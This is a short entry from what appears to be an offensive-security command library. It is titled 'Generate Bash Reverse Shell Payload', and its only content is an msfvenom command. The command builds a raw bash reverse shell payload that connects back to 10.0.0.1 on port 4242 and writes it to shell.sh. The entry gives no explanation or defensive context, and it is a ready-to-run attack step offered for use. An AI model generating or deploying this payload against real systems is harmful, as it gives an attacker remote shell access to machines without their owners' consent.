---
id: b43a75fb-452c-4014-91b3-280f0eb53413
name: Generate Bash Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
output: null
created_at: '2023-04-06T03:56:24.923786+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Bash Reverse Shell Payload

```bash
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
```


